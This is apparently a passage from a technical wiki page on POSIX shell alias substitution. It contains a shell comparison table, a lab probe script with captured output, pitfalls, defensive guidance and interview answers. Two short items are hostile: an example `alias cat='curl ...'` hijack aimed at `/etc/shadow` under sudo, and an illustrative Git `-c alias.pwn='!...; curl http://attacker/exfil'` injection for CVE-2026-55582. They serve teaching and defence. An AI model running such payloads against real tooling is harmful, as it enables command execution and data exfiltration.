| Operator token boundary with quotes (`alias zero='printf "%s" "0"'; zero>&2`) | Quotes prevent operator fusion (`(POSIX.1-2024 XCU alias APPLICATION USAGE)`) | Sends `0` to stderr (lab) | Sends `0` to stderr (lab) | Sends `0` to stderr (lab) | Sends `0` to stderr (lab) | Sends `0` to stderr (lab) | Sends `0` to stderr (lab) | Sends `0` to stderr (lab) | Absent; exits 127 (lab) |
| Global alias support (`alias -g FOO="bar"`) | Not specified in POSIX | No (measured) | No (measured) | Yes (`alias -g`) (measured) | Yes (`alias -g`) (measured) | No (measured) | No (measured) | `yash`: Yes (`-g` / `--global`) (measured); `mksh`/`ash`: No (measured) | No (measured) |
| Suffix alias support (`alias -s txt=cat`) | Not specified in POSIX | No (measured) | No (measured) | Yes (`alias -s`) (measured) | Yes (`alias -s`) (measured) | No (measured) | No (measured) | No (measured) | No (measured) |
| `unalias -a` removes all active definitions | Required (`(POSIX.1-2024 XCU unalias)`) | Yes (lab) | Yes (lab) | Yes (lab) | Yes (lab) | Yes (lab) | Yes (lab) | Yes (lab) | Absent; exits 127 (lab) |
| Missing alias diagnostic stream (`alias nonexistent`) | `stderr` (`(POSIX.1-2024 XCU alias STDERR)`) | `stderr` (lab) | `stderr` (lab) | No message; status 1 (lab) | No message; status 1 (lab) | `stderr` (lab) | `stderr` (lab) | `mksh`: `stdout` (lab); `yash`/`ash`: `stderr` (lab) | `stderr` (exits 127; measured) |

## Worked example

The [lab](../labs/03-aliases/) script `alias-probe.sh` exercises chained trailing blanks, quoting suppression, self-recursion wrapping, mutual recursion cycle termination, the compound command parse barrier, dynamic `eval` unblocking, and operator token boundary fusion across the matrix.

```sh
#!/bin/sh
# Probe POSIX XCU 2.3.1 Alias Substitution semantics across shells.
set -eu

# Ensure alias expansion is enabled in non-interactive bash
# shellcheck disable=SC3044 # shopt is guarded by BASH_VERSION check
if [ -n "${BASH_VERSION-}" ]; then
  shopt -s expand_aliases
fi

# 1. Trailing space chaining
# An alias whose value ends with an unquoted blank causes the next token
# to be checked for alias substitution.
echo_func() {
  printf 'pfx: %s\n' "${*}"
}
alias echo_pfx='echo_func '
alias target_cmd='target_expanded'
printf '1_trailing_space: '
echo_pfx target_cmd

# 2. Quoted bypass
# Quoting any character of a token prevents alias substitution.
probe_cmd() {
  printf 'real_cmd:%s' "${*}"
}
alias probe_cmd='printf "alias_active:%s"'
res1=$(probe_cmd normal)
# shellcheck disable=SC1001 # intentional backslash to test alias suppression
res2=$(\probe_cmd backslash)
res3=$("probe_cmd" doublequote)
res4=$('probe_cmd' singlequote)
printf '2_quoted_bypass:  %s | %s | %s | %s\n' "${res1}" "${res2}" "${res3}" "${res4}"

# 3. Self-recursion prevention
# An alias expanding to its own name terminates recursion at depth 1.
wrap_base() {
  printf 'wrapped(%s)\n' "${*}"
}
alias wrap_base='wrap_base inner'
printf '3_self_recursion: '
wrap_base outer

# 4. Mutual cycle termination
# A cycle of aliases terminates when an ancestor in the recursion stack is seen.
cycle_target() {
  printf 'cycle_target(%s)\n' "${*}"
}
alias cycle_target='cycle_step_b '
alias cycle_step_b='cycle_target '
printf '4_mutual_cycle:   '
cycle_target arg

# 5. Compound command parse barrier
# The entire compound command is parsed before any command in it executes.
compound_res="unexpanded"
if true; then
  # shellcheck disable=SC2262,SC2263 # intentional test of compound command parse barrier
  alias dyn_cmd='compound_res="expanded"'
  dyn_cmd 2>/dev/null || compound_res="barrier_held"
fi
printf '5_parse_barrier:  %s\n' "${compound_res}"

# 6. Eval dynamic execution
# eval invokes the parser at runtime, observing alias table updates.
eval_res="unset"
if true; then
  alias dyn_cmd2='eval_res="eval_succeeded"'
  eval dyn_cmd2
fi
printf '6_eval_dynamic:   %s\n' "${eval_res}"

# 7. Operator token boundary divergence
# bash (shell_getc at the end of the alias text) and zsh (checkalias) add a space,
# so zero_unquoted>&2 passes 0 to printf and redirects fd 1 to 2.
# dash, ksh93, and others do not add space, fusing 0 with >&2 into 0>&2.
# Quoting "0" prevents fusing across all shells.
# eval keeps the alias name and >&2 adjacent: shfmt would insert a space in plain code.
alias zero_unquoted='printf "%s" 0'
alias zero_quoted='printf "%s" "0"'
err_unquoted=$(eval '(zero_unquoted>&2)' 2>&1 >/dev/null)
err_quoted=$(eval '(zero_quoted>&2)' 2>&1 >/dev/null)
printf '7_operator_fuse:  unquoted=<%s> quoted=<%s>\n' "${err_unquoted}" "${err_quoted}"
```

Captured output under GNU `bash` and `zsh`:

```text
1_trailing_space: pfx: target_expanded
2_quoted_bypass:  alias_active:normal | real_cmd:backslash | real_cmd:doublequote | real_cmd:singlequote
3_self_recursion: wrapped(inner outer)
4_mutual_cycle:   cycle_target(arg)
5_parse_barrier:  barrier_held
6_eval_dynamic:   eval_succeeded
7_operator_fuse:  unquoted=<0> quoted=<0>
```

Captured output under `dash`, `ksh93`, BusyBox `ash`, `mksh`, and `yash`:

```text
1_trailing_space: pfx: target_expanded
2_quoted_bypass:  alias_active:normal | real_cmd:backslash | real_cmd:doublequote | real_cmd:singlequote
3_self_recursion: wrapped(inner outer)
4_mutual_cycle:   cycle_target(arg)
5_parse_barrier:  barrier_held
6_eval_dynamic:   eval_succeeded
7_operator_fuse:  unquoted=<> quoted=<0>
```

Captured output under `posh`:

```text
/labs/03-aliases/alias-probe.sh:17: alias: not found
```

In section 1, `echo_pfx` ends with an unquoted blank space, instructing the tokenizer to evaluate the following token `target_cmd`, which expands to `target_expanded` and passes as an argument to `echo_func`.
In section 2, unquoted `probe_cmd` invokes the alias, whereas prefixing with `\` or enclosing in quotes bypasses the alias table and routes directly to the underlying shell function `probe_cmd`.
In section 3 and 4, self-referential and mutually recursive aliases terminate safely without infinite loops because active alias names are locked in the lexer's expansion stack.
In section 5, `dyn_cmd` fails with a command lookup error because the compound `if ... fi` statement was completely parsed into bytecode/AST prior to the execution of `alias dyn_cmd`.
In section 6, `eval` executes the parser dynamically at runtime, observing the newly registered alias table definition.
In section 7, `bash` and `zsh` inject an automatic space after unquoted `0`, passing `0` to `printf` and redirecting standard output to standard error, whereas `dash`, `ksh93`, BusyBox `ash`, `mksh`, and `yash` push `0` without a trailing space, fusing `0` and `>&2` into a redirection of standard input (`0>&2`).
Under `posh` 0.14.1, the probe aborts at line 17 with exit status 127 under `set -e` because the `alias` utility is entirely absent (measured in the shell matrix as of 2026-10).

## Pitfalls

> [!warning] Compound command and function definition parse barrier (Austin Group Defect 1055)
> - Trigger: Defining an alias inside an `if`, `while`, `for`, or `{ ...; }` compound command or inside a shell function body and attempting to call that alias within the same block or function.
> - Symptom: The command fails with `command not found` because the shell grammar parser compiles the entire compound block into an abstract syntax tree before the `alias` command executes (`(POSIX.1-2024 XRAT C.2.3.1; Austin Group Defect 1055)`).
> - Fix: Never define aliases inside control-flow blocks or functions; define functions (`myfunc() { ... }`) for reusable routines, or force dynamic runtime lexing using `eval "myalias"`.

> [!warning] Token boundary operator fusion on unquoted alias values (Austin Group Defect 953)
> - Trigger: Invoking an alias whose value ends in an alphanumeric character immediately adjacent to an unquoted operator token, such as `alias zero='echo 0'; zero>&2`.
> - Symptom: In GNU `bash` and `zsh`, an injected space separates the tokens (`echo 0 >&2`), redirecting stdout to stderr, whereas in `dash`, `ksh93`, `mksh`, `yash`, and BusyBox `ash`, no space is added, fusing `0` and `>&2` into a file descriptor 0 redirection (`0>&2`) that drops the command argument entirely (`(POSIX.1-2024 XCU alias APPLICATION USAGE)`; proved by lab as of 2026-10).
> - Fix: Always enclose trailing arguments in quotes inside alias definitions (`alias zero='echo "0"'`) or append an explicit space (`alias zero='echo 0 '`).

> [!warning] Silent alias dormancy in non-interactive Bash automation
> - Trigger: Running a shell script using a `#!/bin/bash` shebang that defines and invokes aliases without explicitly enabling alias expansion.
> - Symptom: The `alias` built-in executes without error, but every alias invocation fails at runtime with `command not found` because GNU `bash` turns `expand_aliases` off by default in non-interactive mode (`(bash-5.3 shell.c, init_noninteractive)`; proved by lab as of 2026-10).
> - Fix: Replace aliases with POSIX shell functions ([[Functions-and-Scope]]), or explicitly invoke `shopt -s expand_aliases` at the top of the script before any alias declaration is parsed.

> [!warning] Chained trailing blank privilege escalation under `sudo`
> - Trigger: Configuring `alias sudo='sudo '` to preserve user aliases under administrative execution, combined with unvetted user input or automated script invocation.
> - Symptom: The trailing blank forces the shell to expand the second word as an alias under elevated privileges; if an attacker controls a local alias definition (e.g. `alias cat='curl ...'`), `sudo cat /etc/shadow` runs the attacker's alias logic as `root`.
> - Fix: Never use trailing space alias chaining in administrative or shared accounts; execute explicit utility binaries via `command sudo /bin/cat` or absolute paths.

> [!warning] VCS configuration alias injection allowlist bypass (CVE-2026-55582)
> - Trigger: Passing untrusted repository configurations or command-line parameters to Git wrapper tooling that allowlists the `git` executable, such as `git -c alias.x='!sh -c payload' x`; CVE-2026-55582 is this bug in the `mcp-shell` MCP server before 0.6.0, whose default policy allowed `/usr/bin/git` and whose metacharacter filter omitted `!` (CVSS 3.1 8.4, published 2026-08-25).
> - Symptom: Git runs aliases whose value starts with `!` through the shell (`handle_alias()` in `git.c` sets `use_shell` on the child process), executing arbitrary OS commands as the wrapper's user and bypassing the caller's allowlist (`(CVE-2026-55582; git git.c, handle_alias)`).
> - Fix: Git has no command-line option that disables aliases (`git(1)` OPTIONS, as of 2026-10), so reject `-c` and `--config-env` arguments and any `alias.*` configuration keys from untrusted callers, apply per-executable argument policies, and use explicit subcommands rather than allowing dynamic alias resolution.

> [!warning] In-flight `unalias` during input stream stack unwinding
> - Trigger: Invoking `unalias foo` while `foo` is currently undergoing active expansion on the parser pushdown stack (for example, inside a function or `eval` called by `foo`).
> - Symptom: In vulnerable or naive shell implementations, immediately deallocating the alias data structure while the parser's input buffer pointer (`parsefile->nextc`) still references `ap->val` triggers heap memory corruption or use-after-free crashes.
> - Fix: Modern shells implement deferred reclamation: `dash` and BusyBox `ash` set `ALIASDEAD` and postpone freeing the node until `freestrings()` unwinds (`(dash src/alias.c, freealias; dash-0.5.12 src/input.c, freestrings)`).

> [!warning] mksh alias query diagnostic leakage to stdout
> - Trigger: Testing whether an alias is defined or querying an alias definition via `alias name` in `mksh` scripts while redirecting standard error (`alias name 2>/dev/null`).
> - Symptom: `mksh` writes its diagnostic message `name alias not found` to standard output (file descriptor 1) instead of standard error, leaking diagnostic text into command substitutions (`var=$(alias name 2>/dev/null)`) and data pipelines (`(mksh funcs.c, c_alias)`).
> - Fix: Redirect both standard output and standard error simultaneously (`alias name >/dev/null 2>&1`), or inspect defined aliases with `type` or `whence`.

> [!warning] Missing alias and unalias utilities in minimal policy shells (posh)
> - Trigger: Executing shell scripts containing `alias` or `unalias` under `posh` or systems using `posh` as `/bin/sh`.
> - Symptom: Commands fail immediately with exit status 127 (`posh: alias: not found` or `posh: unalias: not found`) because Debian `posh` 0.14.1 has no alias machinery at all, although `alias` has been a Base utility since Issue 7 (measured in the shell matrix as of 2026-10; `(POSIX.1-2024 XCU alias CHANGE HISTORY)`).
> - Fix: Never rely on `alias` or `unalias` in scripts targeting `/bin/sh`; define POSIX shell functions ([[Functions-and-Scope]]) for reusable logic.

## Security and robustness

### Execution environment isolation across privilege boundaries

POSIX mandates that, when used as specified, alias definitions shall not be inherited by separate invocations of the shell or by utility execution environments (`(POSIX.1-2024 XCU 2.3.1; XCU 2.13; XCU alias RATIONALE)`).
When a shell invokes `execve(2)`, alias definitions remain strictly within the parent process's heap:
- Subshells created via `( ... )` or `$( ... )` inherit copies of active aliases because they duplicate the existing process memory via `fork(2)` ([[Subshells-and-the-Execution-Environment]]).
- Separate script executions (e.g. `sh script.sh`), cron jobs, and commands executed via `sudo` or `ssh` inherit no aliases from their parent; they start with only the aliases the implementation predefines (POSIX allows predefined aliases, and `mksh` ships several) plus whatever their own startup files define, immunizing child processes against inherited alias hijacking (`(POSIX.1-2024 XCU 2.3.1)`; `(mksh main.c, initcoms)`).
- Historical versions of KornShell allowed aliases to be exported to scripts invoked by the same shell through `alias -x`; POSIX allows this only as an explicit extension, because the standard developers considered aliases to be primarily for interactive users and that they should normally not affect the scripts those users call (`(POSIX.1-2024 XCU alias RATIONALE)`).

### Bypassing untrusted aliases in defensive scripts

Defensive shell scripts and security automation must ensure that standard utility names (`ls`, `cp`, `rm`, `cat`, `grep`) execute authentic binaries rather than untrusted user aliases defined in interactive profiles (`~/.bashrc`, `~/.zshrc`).
POSIX provides three distinct mechanisms to bypass the alias table:
1. **Backslash quoting (`\cmd`)**:
   Prefixing the utility name with a backslash (`\cp -f src dest`) prevents alias substitution because condition 1 of `(POSIX.1-2024 XCU 2.3.1)` requires the token to contain zero quoting characters.
   Quote removal ([[Quote-Removal]]) subsequently strips the backslash before `execve(2)`.
2. **The `command` built-in (`command cmd`)**:
   Invoking `command rm file` executes the intrinsic utility `command` (`(POSIX.1-2024 XCU command)`), which suppresses shell function lookup while preserving built-ins and `PATH` search ([[Command-Search-and-PATH]]); alias substitution is suppressed because `rm` is no longer in command-name position (condition 5 of `(POSIX.1-2024 XCU 2.3.1)`), unless `command` itself is aliased to a value ending in a blank.
3. **Absolute pathname resolution (`/bin/rm file`)**:
   Because `(POSIX.1-2024 XBD 3.10)` excludes `/` from valid alias names, absolute and relative pathnames are structurally incapable of matching any entry in the alias hash table.

### Global alias hazards in `zsh` and `yash`

Both `zsh` and `yash` implement global aliases via `alias -g NAME=val` (or `alias --global` in `yash`).
Unlike standard POSIX aliases, which only expand in command position, global aliases expand **anywhere** a matching word token appears on the command line:
- Defining `alias -g G='| grep -i'` rewrites pipelines dynamically.
- Defining `alias -g L='| less'` redirects terminal output.
In security contexts, global aliases represent an extreme hazard: an adversary who injects a global alias into `~/.zshrc` (such as `alias -g NE='2>/dev/null'`) can silently suppress security logs, divert redirection targets, or alter arguments passed to sensitive commands across entire interactive sessions.

### Defensive coding checklist

1. **Never use aliases in automation**: Always declare reusable shell routines as POSIX functions (`my_func() { ... }`) to ensure lexical stability, a real parameter list, and portable argument handling ([[Functions-and-Scope]]).
2. **Defend against alias hijacking**: In scripts that source third-party configuration files, invoke `\command` or prefix critical commands with `command` to ensure authentic utility execution.
3. **Guard non-interactive Bash**: If aliases must be used in a Bash script, explicitly execute `shopt -s expand_aliases` before declaring any alias.
4. **Isolate compound blocks**: If an alias must be dynamically generated and invoked within a single script transaction, wrap the invocation in `eval "$alias_name"`.
5. **Lock down toolchain configurations**: In CI/CD runners and orchestration agents, Git offers no flag that disables aliases, so validate that arguments and configuration inputs cannot inject `-c alias.*` or other `alias.*` directives (`(CVE-2026-55582)`).

## The principal's view

To a staff-plus systems engineer, shell aliases are an interactive user convenience inherited from the C shell and standardized in their KornShell form for terminal muscle memory (`(POSIX.1-2024 XCU alias RATIONALE; XRAT C.2.3.1)`), not an engineering abstraction for software systems.
Aliases manipulate code at the raw lexical token layer prior to syntax validation, making them brittle, unparameterized, and untestable:
- **Lack of parameters**: Aliases cannot accept positional parameters (`$1`, `$2`) or validate argument counts; they merely paste text onto the input buffer, forcing developers to rely on clumsy trailing space chaining or trailing argument concatenation.
- **Lexical leakage**: Because aliases expand before grammar parsing, they can alter statement boundaries, inject unexpected redirection operators, or fuse with adjacent tokens, creating silent Heisenbugs across different shell interpreters.
- **Parse barrier fragility**: The inability of compound commands and functions to see newly declared aliases without `eval` makes aliases completely unsuitable for dynamic configuration or modular library loading.
- **Zero process inheritance**: Aliases cannot be exported to subprocesses, making them useless for environment-wide tooling wrappers across multi-process orchestration frameworks.
- **Portability breakdown in minimal environments**: Minimal policy-compliant shells like `posh` omit `alias` and `unalias` completely, non-interactive `bash` disables alias expansion by default, and `mksh` leaks query diagnostics to stdout, making aliases completely untrustworthy in cross-platform shell scripts.

Architectural decision matrix for command abstraction:
- Use **shell aliases** exclusively in personal interactive profile dotfiles (`~/.bashrc`, `~/.zshrc`) for typing ergonomics (e.g. `alias g=git`, `alias k=kubectl`, `alias ll='ls -la'`).
- Use **POSIX shell functions** (`my_tool() { ... }`) for parameterized, modular logic within a single script or sourcing library ([[Functions-and-Scope]]).
- Use **standalone executable scripts** placed in a managed `PATH` directory (`/usr/local/bin`, `~/.local/bin`) when an abstraction must be callable across subshells, background daemons, cron jobs, Python subprocesses, and diverse programming languages ([[Command-Search-and-PATH]]).

## Interview questions

> [!question] L5: Predict the output of the following script across GNU `bash` (with `expand_aliases`), `dash`, and `ksh93`, and explain why they diverge:
> ```sh
> alias zero='printf "%s" 0'
> zero>&2
> ```
>
> > [!success]- Answer
> > In GNU `bash` (and `zsh`), the script outputs `0` to standard error, whereas in `dash`, `ksh93`, `mksh`, `yash`, and BusyBox `ash`, it outputs nothing to standard error and nothing to standard output (proved by lab as of 2026-10).
> > Under `(bash-5.3 parse.y, shell_getc)`, GNU `bash` returns an extra `<space>` byte at the end of an alias replacement string whenever the string does not end in a blank, newline, or shell metacharacter (older releases appended it in `mk_alexpansion()`), and `zsh` pushes a space in `checkalias()` when the next input character is not blank (`(zsh Src/lex.c, checkalias)`).
> > Because `'0'` is not a metacharacter, `bash` expands `zero>&2` into `printf "%s" 0 >&2`, passing `'0'` as the second argument to `printf` and redirecting standard output to file descriptor 2.
> > In `dash`, `ksh93`, BusyBox `ash`, `mksh`, and `yash`, `pushstring()` pushes the alias value verbatim without an extra space (`(dash-0.5.12 src/input.c, pushstring)`).
> > In `posh`, the script fails at the first line with exit status 127 (`posh: alias: not found`) because `posh` omits the `alias` utility entirely (measured in the shell matrix as of 2026-10).
> > The trailing `'0'` immediately precedes `>&2` without a delimiter, causing the lexer to fuse them into the single redirection operator `0>&2` (redirect standard input from file descriptor 2) per `(POSIX.1-2024 XCU alias APPLICATION USAGE)`.
> > Because `printf "%s"` receives zero arguments, `printf` exits cleanly without printing any bytes, leaving both standard output and standard error completely empty.
> >
> > Follow-up: How do you modify the alias definition so that it produces identical behavior across all POSIX shells without adding a trailing space?

> [!question] L5: Why do `\cmd`, `'cmd'`, and `"cmd"` bypass alias expansion in POSIX shells, and how does this behavior differ from invoking `command cmd`?
>
> > [!success]- Answer
> > Under `(POSIX.1-2024 XCU 2.3.1 Cond 1)`, a token is eligible for alias substitution only if it contains zero quoting characters.
> > Introducing a backslash `\cmd`, single quotes `'cmd'`, or double quotes `"cmd"` causes condition 1 to evaluate to false during lexical token recognition, forcing the shell to skip the alias table entirely (`(POSIX.1-2024 XCU 2.3.1)`).
> > After lexical parsing completes, step 4 quote removal ([[Quote-Removal]]) strips the quotation characters, leaving the clean literal command word `cmd`.
> > By contrast, `command cmd` executes the POSIX intrinsic utility `command` ([[Special-Built-ins-versus-Utilities]]), which bypasses both aliases (because `cmd` is no longer in command-name position) AND shell functions ([[Functions-and-Scope]]) while searching exclusively for built-in utilities and filesystem executables in `PATH` (`(POSIX.1-2024 XCU command)`).
> > Quoting `\cmd` bypasses aliases but will still execute a shell function named `cmd` if one exists, whereas `command cmd` bypasses both aliases and functions.
> >
> > Follow-up: If both an alias `cmd` and a function `cmd` exist, what does `\cmd` execute?

> [!question] L6: Debug this script: why does this deployment logger fail with `log: command not found` when `$DEBUG` is `1`, and how do you rewrite it cleanly?
> ```sh
> #!/bin/sh
> set -eu
> if [ "${DEBUG-}" = "1" ]; then
>   alias log='printf "[DEBUG] %s\n"'
>   log "Starting build process"
> fi
> ```
>
> > [!success]- Answer
> > The script fails because the entire `if ... fi` compound command is read and parsed by the shell's grammar parser as a single `compound_list` before any statement inside it begins execution (`(POSIX.1-2024 XCU 2.10; Austin Group Defect 1055)`).
> > When the lexer encounters `log "Starting build process"`, the `alias log` statement has not yet executed.
> > Because `log` is not present in the alias table at parse time, the tokenizer compiles `log` as an external command word.
> > When the block executes at runtime, `alias log` populates the alias table, but the shell subsequently attempts to execute the pre-compiled AST node `log`, which does not exist in `PATH` and fails with exit code 127 (`(POSIX.1-2024 XRAT C.2.3.1)`).
> > The bug cannot be fixed by moving `log` to a separate line within the same `if` block, because the parse barrier applies to the entire compound command.
> > The clean, idiomatic fix is to replace the alias with a shell function:
> > ```sh
> > if [ "${DEBUG-}" = "1" ]; then
> >   log() { printf '[DEBUG] %s\n' "$*"; }
> > else
> >   log() { :; }
> > fi
> > log "Starting build process"
> > ```
> >
> > Follow-up: If you were strictly required to keep the alias definition inside the block, how could you force the shell to execute it?

> [!question] L6: How does the trailing `<blank>` mechanism work in POSIX alias substitution, and what prevents `alias sudo='sudo '` from triggering an infinite recursion loop when a user runs `sudo sudo ls`?
>
> > [!success]- Answer
> > Under `(POSIX.1-2024 XCU 2.3.1)`, if the replacement value of an alias ends in an unquoted blank (`<space>` or `<tab>`), the shell sets an internal parser flag (`AL_EXPANDNEXT` in `bash`, `CHKALIAS` in `dash`) instructing the lexer to check the subsequent token for alias substitution.
> > In `sudo sudo ls`, the first `sudo` token matches the alias table and is replaced by `sudo ` with its in-use flag set (`AL_BEINGEXPANDED` / `ALIASINUSE`).
> > The lexer then reads the `sudo` inside the replacement text; condition 4 of `(POSIX.1-2024 XCU 2.3.1)` forbids substituting a token that resulted from an earlier substitution of the same alias name, so that `sudo` is emitted literally, and this is what prevents infinite recursion.
> > Because the replacement string ends with a space, the lexer then inspects the second `sudo` token from the original input.
> > That token did not result from any alias substitution, so it is substituted again (to `sudo `), and the trailing blank of that second replacement makes the lexer check `ls` as well.
> > The input therefore becomes `sudo sudo ls` with `ls` alias-checked; the process terminates because each substitution consumes one input word, and the same behavior with `alias s='f '` turning `s s s x` into `f f f x` is measured in every alias-capable matrix shell (proved by lab as of 2026-10).
> >
> > Follow-up: If `alias sudo='sudo '` and `alias ls='echo list: '`, what is the exact token expansion sequence for `sudo ls`?

> [!question] L6: How can an alias create a pipeline or redirection operator, whereas an unquoted variable containing identical text cannot?
>
> > [!success]- Answer
> > Alias substitution operates during lexical scanning ([[Token-Recognition]]) before grammatical reduction or abstract syntax tree generation occurs (`(POSIX.1-2024 XCU 2.3.1)`).
> > When an alias such as `alias mypipe='grep foo | wc -l'` is substituted, its replacement string is pushed onto the input character stream, and lexical scanning restarts from the beginning of the replacement text.
> > The lexical analyzer reads the pipe character `|` directly from the pushed input and converts it into the grammar token `PIPE` (`|`), allowing `yyparse()` to construct a `pipeline` grammar production ([[Pipelines-and-And-Or-Lists]]).
> > By contrast, variable expansion (`$cmd`) occurs during step 1 of word expansion ([[Expansion-Order]]), long after grammar parsing has completed and fixed the command structure (`(POSIX.1-2024 XCU 2.6)`).
> > The results of parameter expansions undergo field splitting ([[Field-Splitting-and-IFS]]) and pathname expansion ([[Pathname-Expansion]]), but can never be re-parsed as shell grammar operators; any `|` byte produced by `$cmd` is treated strictly as a literal argument string passed to `execve(2)`.
> >
> > Follow-up: Why did the Bourne shell and POSIX designers choose not to re-parse the results of variable expansions?

> [!question] L7+: Why does GNU `bash` disable alias expansion by default in non-interactive shell scripts, but enable it when invoked as `sh` or with `--posix`, and how do `shell.c`, `general.c`, and `builtins/shopt.def` implement this behavior?
>
> > [!success]- Answer
> > In GNU `bash`, the global variable `expand_aliases` declared in `parse.y` controls whether the parser performs alias lookups during command tokenization (`(bash-5.3 parse.y, line 265)`).
> > During shell initialization in `shell.c`, `init_interactive()` sets `expand_aliases = expaliases_flag = 1`, while `init_noninteractive()` sets both to the value of `posixly_correct`, so they are `0` for non-interactive scripts outside POSIX mode (`(bash-5.3 shell.c, init_interactive and init_noninteractive)`).
> > The bash manual only states the behavior, that aliases are not expanded when the shell is not interactive unless `expand_aliases` is set with `shopt`, and the bash `NEWS` and `CHANGES` files give no motive for it (`(bash-5.3 doc/bashref.texi, Aliases; NEWS; CHANGES)`).
> > The POSIX rationale for aliases is that they are primarily of use to interactive users and should normally not affect the scripts those users call (`(POSIX.1-2024 XCU alias RATIONALE)`).
> > However, when `bash` is invoked as `sh` or passed `--posix`, `main()` in `shell.c` enables `posixly_correct`.
> > In `general.c`, `posix_initialize()` runs whenever POSIX mode is turned on at startup or via `set -o posix`, and it sets `expand_aliases = expaliases_flag = 1` even in non-interactive scripts, because `(POSIX.1-2024 XCU 2.3.1)` requires alias substitution in every shell with no interactive-only exception (`(bash-5.3 general.c, posix_initialize)`).
> > In standard `bash` scripts, developers must explicitly execute `shopt -s expand_aliases` (which sets `expaliases_flag` and `expand_aliases` via `shopt_set_expaliases` in `builtins/shopt.def`) before the aliased command is parsed.
> >
> > Follow-up: If a script running under standard non-interactive `bash` executes `alias foo="echo hi"` followed by `foo` on the next line, what is the exact exit code and stderr string?

> [!question] L7+: How does `dash` manage memory safety and prevent use-after-free bugs when an alias is deleted via `unalias` while that exact alias is actively being expanded on the input stack, referencing `struct alias`, `struct strpush`, `ALIASINUSE`, and `ALIASDEAD`?
>
> > [!success]- Answer
> > In `dash`, active input streams are managed by a pushdown stack of `struct strpush` frames rooted at `parsefile->strpush` (`(dash-0.5.12 src/input.h)`).
> > When `lookupalias()` finds an eligible alias, `pushstring()` pushes a `struct strpush` frame onto `parsefile->strpush`, stores the alias pointer in `sp->ap`, and marks `ap->flag |= ALIASINUSE` (`(dash-0.5.12 src/input.c, pushstring)`).
> > The parser's input pointer `parsefile->nextc` points directly to the allocated string buffer `ap->val`.
> > If execution inside that expansion calls `unalias name`, `unalias()` calls `__lookupalias()` followed by `freealias(ap)` (`(dash src/alias.c, unalias)`).
> > Inside `freealias()`, `dash` checks `if (ap->flag & ALIASINUSE)`.
> > If `ALIASINUSE` is set, `freealias()` refuses to call `ckfree()`; instead, it sets `ap->flag |= ALIASDEAD` and leaves the node allocated in memory (`(dash src/alias.c, freealias)`).
> > When the parser finishes consuming the replacement string, `popstring()` restores the previous input state.
> > Finally, `freestrings()` traverses the stack of popped frames: it checks `sp->ap`, clears `sp->ap->flag &= ~ALIASINUSE`, and if `sp->ap->flag & ALIASDEAD` is present, it invokes `unalias(sp->ap->name)` to safely deallocate the orphan node once no input buffer references it (`(dash-0.5.12 src/input.c, freestrings)`).
> >
> > Follow-up: What would happen if `freealias()` deallocated `ap` immediately when `unalias` was called?

> [!question] L7+: In cloud orchestration and security engineering, how does an attacker exploit Git shell aliases via configuration injection (`CVE-2026-55582`), how does Git execute aliases under the hood, and how must an agent or subprocess sandbox enforce execution boundaries?
>
> > [!success]- Answer
> > Git allows custom subcommands to be registered through its configuration system (`.gitconfig` or command-line flags) via the `alias.<name>` configuration namespace (`(git(1))` documentation).
> > When an alias value begins with an exclamation point `!`, Git does not execute an internal Git command; instead, `handle_alias()` runs the remainder of the alias string as a child process with `use_shell` set, so the system shell (`sh -c`) interprets it (`(git git.c, handle_alias)`).
> > In `CVE-2026-55582`, the `mcp-shell` MCP server before 0.6.0 restricted commands with a secure-mode allowlist whose default `security.yaml` permitted `/usr/bin/git`, while its metacharacter checks in `security.go` omitted `!` and it applied no per-executable argument policy.
> > An attacker supplied a command of the form `/usr/bin/git -c alias.pwn='!id; curl http://attacker/exfil' pwn` (the record gives `-c alias.pwn=!<arbitrary-command>`; the payload here is illustrative).
> > Git parsed the `-c` flag into its runtime configuration, recognized `pwn` as an aliased subcommand, stripped `!`, and ran `id; curl http://attacker/exfil` through the shell, completely bypassing the allowlist and executing arbitrary OS commands as the `mcp-shell` process user (CVSS 3.1 base score 8.4, published 2026-08-25, fixed in 0.6.0) (`(CVE-2026-55582)`).
> > To defend against this exploit, agentic sandboxes must enforce three layers: since Git has no command-line option that disables aliases (`git(1)` OPTIONS, as of 2026-10), reject or sanitize `-c` and `--config-env` arguments matching `alias.*` or `core.*`, apply a per-executable argument policy, and invoke binaries directly via `execve(2)` with fixed argument arrays rather than executing user-supplied strings through a shell.
> >
> > Follow-up: Why does Mercurial have an identical vulnerability surface with its `--config alias.*` parameter?

## Related

Prerequisites: [[Shell-Grammar]]

Next: [[Quoting-Backslash-Single-and-Double]]

See also: [[Token-Recognition]], [[Expansion-Order]], [[Simple-Commands-and-Assignment-Prefixes]], [[Special-Built-ins-versus-Utilities]], [[Command-Search-and-PATH]], [[Pipelines-and-And-Or-Lists]], [[Compound-Commands]], [[Functions-and-Scope]], [[Subshells-and-the-Execution-Environment]], [[The-eval-Builtin]], [[The-set-Builtin-and-Shell-Options]], [[POSIX-2024-Changes]]

## Further reading

- [POSIX.1-2024 XCU 2.3.1 Alias Substitution](https://pubs.opengroup.org/onlinepubs/9799919799/utilities/V3_chap02.html#tag_19_03_01) - the normative lexical specification defining token eligibility, pushdown input replacement, and trailing blank chaining.
- [POSIX.1-2024 XCU `alias` Built-in Utility](https://pubs.opengroup.org/onlinepubs/9799919799/utilities/alias.html) - requirements for the intrinsic `alias` utility, display quoting formats, and operator fusion boundary rationales.
- [POSIX.1-2024 XCU `unalias` Built-in Utility](https://pubs.opengroup.org/onlinepubs/9799919799/utilities/unalias.html) - requirements for selective and global alias deallocation (`unalias -a`).
- [POSIX.1-2024 XBD 3.10 Alias Name](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap03.html#tag_03_10) - normative portable character set definitions and hyphen restrictions governing valid alias identifiers.
- [POSIX.1-2024 XRAT C.2.3.1 Alias Substitution Rationale](https://pubs.opengroup.org/onlinepubs/9799919799/xrat/V4_xcu_chap01.html#tag_23_02_03_01) - historical analysis of KornShell versus C shell behavior, compound list parse barriers, and trailing space trade-offs.
- [Austin Group Defect 1055 (Shell Parsing Boundaries)](https://austingroupbugs.net/view.php?id=1055) - codifies the relationship between `complete_command` execution, `compound_list` parse trees, and alias table visibility.
- [Austin Group Defect 1630 (Alias Names)](https://austingroupbugs.net/view.php?id=1630) - a request to forbid leading hyphens in alias names, accepted as marked without that restriction: it reworded the trailing-blank condition of XCU 2.3.1 and documents chained option aliases such as `alias -- -0='-0 '`.
